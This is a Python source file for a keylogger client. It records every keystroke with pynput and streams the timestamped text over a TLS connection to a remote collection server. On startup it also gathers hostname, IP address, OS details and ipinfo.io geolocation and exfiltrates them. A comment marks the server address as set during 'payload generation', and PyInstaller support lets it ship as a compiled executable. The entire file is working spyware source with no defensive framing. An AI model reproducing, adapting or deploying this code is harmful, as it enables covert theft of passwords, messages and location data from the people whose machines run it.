from pynput.keyboard import Key, Listener
import socket
import ssl
import threading
import platform
import time
import requests
import sys
import os

# CONFIGURATION - Will be replaced during payload generation
SSL_SERVER_HOST = "127.0.0.1"
SSL_SERVER_PORT = 10000




def get_resource_path(relative_path):
    """
    Get absolute path to resource - works for dev and PyInstaller
    When running as script: uses current directory
    When compiled: uses PyInstaller's temporary folder (_MEIPASS)
    """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
        print(f"[*] Running as compiled EXE")
        print(f"[*] Base path: {base_path}")
    except AttributeError:
        # Running as normal Python script
        base_path = os.path.dirname(os.path.abspath(__file__))
        print(f"[*] Running as Python script")
        print(f"[*] Base path: {base_path}")

    full_path = os.path.join(base_path, relative_path)
    return full_path


def get_certificate_paths():
    """
    Get certificate paths with multiple fallback options
    Tries both client1_cert.pem and client_cert.pem naming conventions
    """
    cert_dir = get_resource_path('certs')

    # Try multiple naming conventions
    cert_options = [
        ('client1_cert.pem', 'client1_key.pem'),  # Your current naming
        ('client_cert.pem', 'client_key.pem'),  # Standard naming
        ('client2_cert.pem', 'client2_key.pem'),  # Alternative
    ]

    print(f"[*] Looking for certificates in: {cert_dir}")

    # Check if cert directory exists
    if not os.path.exists(cert_dir):
        print(f"[!] Certificate directory not found: {cert_dir}")
        print(f"[*] Current directory contents:")
        try:
            current_dir = os.path.dirname(cert_dir)
            for item in os.listdir(current_dir):
                print(f"    - {item}")
        except:
            pass
        return None, None, None

    print(f"[*] Certificate directory contents:")
    for item in os.listdir(cert_dir):
        print(f"    - {item}")

    # Try to find matching certificate files
    client_cert = None
    client_key = None

    for cert_name, key_name in cert_options:
        cert_path = os.path.join(cert_dir, cert_name)
        key_path = os.path.join(cert_dir, key_name)

        if os.path.exists(cert_path) and os.path.exists(key_path):
            client_cert = cert_path
            client_key = key_path
            print(f"[+] Found certificates: {cert_name} / {key_name}")
            break

    if not client_cert:
        print(f"[!] No valid client certificate found")
        print(f"[!] Tried: {', '.join([opt[0] for opt in cert_options])}")
        return None, None, None

    # CA certificate
    ca_cert = os.path.join(cert_dir, 'ca_cert.pem')
    if not os.path.exists(ca_cert):
        print(f"[!] CA certificate not found: {ca_cert}")
        return None, None, None

    print(f"[+] All certificates found:")
    print(f"    - Client cert: {client_cert}")
    print(f"    - Client key: {client_key}")
    print(f"    - CA cert: {ca_cert}")

    return client_cert, client_key, ca_cert



secure_socket = None
socket_lock = threading.Lock()



def create_ssl_context():
    """Create SSL context for client with certificate authentication"""
    try:
        # Get certificate paths dynamically
        client_cert, client_key, ca_cert = get_certificate_paths()

        if not all([client_cert, client_key, ca_cert]):
            print("[!] Cannot create SSL context - missing certificates")
            return None

        # Create SSL context
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

        # Load client certificate and private key
        print(f"[*] Loading client certificate...")
        context.load_cert_chain(
            certfile=client_cert,
            keyfile=client_key
        )

        # Load CA certificate to verify server
        print(f"[*] Loading CA certificate...")
        context.load_verify_locations(cafile=ca_cert)

        # Require server certificate verification
        context.check_hostname = False  # Set to True if using proper hostname
        context.verify_mode = ssl.CERT_REQUIRED

        # Set strong cipher suites
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')

        # Allow TLS 1.2 and 1.3
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        print("[+] SSL context created successfully")
        return context

    except FileNotFoundError as e:
        print(f"[!] Certificate file not found: {e}")
        return None
    except ssl.SSLError as e:
        print(f"[!] SSL error creating context: {e}")
        return None
    except Exception as e:
        print(f"[!] Error creating SSL context: {e}")
        import traceback
        traceback.print_exc()
        return None


def connect_to_server(max_retries=3):
    """Establish persistent SSL connection to server with retries"""
    global secure_socket

    for attempt in range(1, max_retries + 1):
        try:
            print(f"\n[*] Connection attempt {attempt}/{max_retries}...")

            # Create SSL context
            ssl_context = create_ssl_context()
            if not ssl_context:
                print("[!] Failed to create SSL context")
                if attempt < max_retries:
                    print(f"[*] Retrying in 3 seconds...")
                    time.sleep(3)
                    continue
                return False

            # Create raw socket
            print(f"[*] Connecting to {SSL_SERVER_HOST}:{SSL_SERVER_PORT}...")
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_socket.settimeout(10)  # 10 second timeout

            # Connect
            raw_socket.connect((SSL_SERVER_HOST, SSL_SERVER_PORT))
            print(f"[+] TCP connection established")

            # Wrap with SSL
            print(f"[*] Starting SSL handshake...")
            secure_socket = ssl_context.wrap_socket(
                raw_socket,
                server_hostname=SSL_SERVER_HOST if SSL_SERVER_HOST != "127.0.0.1" else None
            )

            # Get connection info
            cipher = secure_socket.cipher()
            version = secure_socket.version()

            print(f"[+] SSL handshake successful!")
            print(f"    - Server: {SSL_SERVER_HOST}:{SSL_SERVER_PORT}")
            print(f"    - Cipher: {cipher}")
            print(f"    - TLS Version: {version}")

            return True

        except ssl.SSLError as e:
            print(f"[!] SSL Error: {e}")
            print("[!] Possible issues:")
            print("    - Certificate may be revoked")
            print("    - Certificate mismatch")
            print("    - Server certificate invalid")
            secure_socket = None

        except ConnectionRefusedError:
            print(f"[!] Connection refused")
            print(f"[!] Is the server running on {SSL_SERVER_HOST}:{SSL_SERVER_PORT}?")
            secure_socket = None

        except socket.timeout:
            print(f"[!] Connection timeout - server not responding")
            secure_socket = None

        except socket.gaierror as e:
            print(f"[!] DNS resolution failed: {e}")
            print(f"[!] Cannot resolve hostname: {SSL_SERVER_HOST}")
            secure_socket = None

        except Exception as e:
            print(f"[!] Connection error: {e}")
            import traceback
            traceback.print_exc()
            secure_socket = None

        # Retry logic
        if attempt < max_retries:
            print(f"[*] Retrying in 3 seconds...")
            time.sleep(3)

    print(f"[!] Failed to connect after {max_retries} attempts")
    return False


def send_data_to_gui(data):
    """Send data over persistent SSL connection"""
    global secure_socket

    with socket_lock:
        try:
            if secure_socket is None:
                print("[!] Not connected, attempting to reconnect...")
                if not connect_to_server():
                    print("[!] Failed to reconnect, data not sent")
                    return False

            # Send data with newline delimiter
            message = data + "\n"
            secure_socket.sendall(message.encode('utf-8'))
            print(f"[+] Sent: {data[:80]}...")
            return True

        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"[!] Connection lost: {e}")
            print("[!] Attempting to reconnect...")
            secure_socket = None

            if connect_to_server():
                # Retry sending
                try:
                    secure_socket.sendall((data + "\n").encode('utf-8'))
                    print(f"[+] Sent after reconnect: {data[:80]}...")
                    return True
                except Exception as e2:
                    print(f"[!] Failed to send after reconnect: {e2}")
                    return False
            return False

        except Exception as e:
            print(f"[!] Error sending data: {e}")
            return False




def format_key(key):
    """Format key into readable string"""
    if key == Key.space:
        return " "
    elif key == Key.enter:
        return "\n"
    elif key == Key.backspace:
        return "[BACKSPACE]"
    elif isinstance(key, Key):
        return f"[{key.name.upper()}]"
    else:
        return str(key).replace("'", "")


def send_current_char(char):
    """Send accumulated keystrokes with timestamp"""
    if char.strip():
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        send_data_to_gui(f"KEYLOG: [{timestamp}] {char.strip()}")


def send_initial_data():
    """Send computer info and geo-location on startup"""
    print("\n[*] Gathering system information...")
    computer_info = get_computer_info()
    geo_location = get_geo_location()

    print("[*] Sending computer information...")
    computer_info_one_line = computer_info.replace("\n", " | ")
    if not send_data_to_gui(f"COMPUTER_INFO: {computer_info_one_line}"):
        print("[!] Failed to send computer information")
        return False

    time.sleep(0.5)

    print("[*] Sending geo-location information...")
    geo_location_one_line = geo_location.replace("\n", " | ")
    if not send_data_to_gui(f"GEO_LOCATION: {geo_location_one_line}"):
        print("[!] Failed to send geo-location")
        return False

    print("[+] Initial data sent successfully")
    return True


def get_computer_info():
    """Retrieve computer information"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()

        computer_info = (
            f"Hostname: {hostname}\n"
            f"IP Address: {ip_address}\n"
            f"Operating System: {system} {release}\n"
            f"OS Version: {version}\n"
            f"Machine: {machine}\n"
            f"Processor: {processor}\n"
        )
        return computer_info
    except Exception as e:
        return f"Error gathering computer info: {e}"


def get_geo_location():
    """Retrieve geo-location information"""
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            location = (
                f"IP Address: {data.get('ip', 'N/A')}\n"
                f"City: {data.get('city', 'N/A')}\n"
                f"Region: {data.get('region', 'N/A')}\n"
                f"Country: {data.get('country', 'N/A')}\n"
                f"Location (Lat, Long): {data.get('loc', 'N/A')}\n"
                f"Organization: {data.get('org', 'N/A')}\n"
            )
            return location
        else:
            return "Failed to get geo-location data."
    except Exception as e:
        return f"Error retrieving geo-location: {e}"




current_char = ""


def on_press(key):
    """Handle key press events"""
    pass


def on_release(key):
    """Handle key release events"""
    global current_char

    formatted = format_key(key)

    if formatted == "\n":
        send_current_char(current_char)
        current_char = ""
    elif formatted == "[BACKSPACE]":
        if current_char:
            current_char = current_char[:-1]
    else:
        current_char += formatted

    # Auto-send every 50 characters to avoid losing data
    if len(current_char) >= 50:
        send_current_char(current_char)
        current_char = ""

    # Stop on ESC key
    if key == Key.esc:
        return False


def start_listener():
    """Start keyboard listener"""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



def start_keylogger():
    """Main keylogger entry point"""
    print("=" * 70)
    print("SSL/TLS Keylogger Client")
    print("=" * 70)
    print(f"Target Server: {SSL_SERVER_HOST}:{SSL_SERVER_PORT}")
    print("=" * 70)

    # Test certificate loading first
    print("\n[*] Verifying certificates...")
    client_cert, client_key, ca_cert = get_certificate_paths()
    if not all([client_cert, client_key, ca_cert]):
        print("\n[!] FATAL ERROR: Cannot find certificates!")
        print("[!] The program cannot run without valid certificates.")
        print("\n[*] Expected certificates:")
        print("    - certs/client_cert.pem (or client1_cert.pem)")
        print("    - certs/client_key.pem (or client1_key.pem)")
        print("    - certs/ca_cert.pem")
        input("\nPress Enter to exit...")
        return

    # Connect to server
    print("\n[*] Establishing connection to server...")
    if not connect_to_server():
        print("\n[!] FATAL ERROR: Cannot connect to server!")
        print("\n[*] Troubleshooting:")
        print("    1. Is the server running?")
        print("    2. Is the IP address correct?")
        print("    3. Is port 10000 open?")
        print("    4. Is firewall blocking the connection?")
        print("    5. Are the certificates valid?")
        input("\nPress Enter to exit...")
        return

    # Send initial data
    if not send_initial_data():
        print("[!] Warning: Failed to send initial data")

    # Start keylogger
    print("\n[*] Starting keylogger...")
    print("[*] Press ESC to stop (when running as script)")
    print("=" * 70 + "\n")

    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    # Keep main thread alive
    try:
        listener_thread.join()
    except KeyboardInterrupt:
        print("\n[*] Keyboard interrupt received")
    finally:
        # Cleanup
        if secure_socket:
            try:
                secure_socket.close()
                print("[*] Connection closed")
            except:
                pass
        print("[*] Shutdown complete")


if __name__ == "__main__":
    start_keylogger()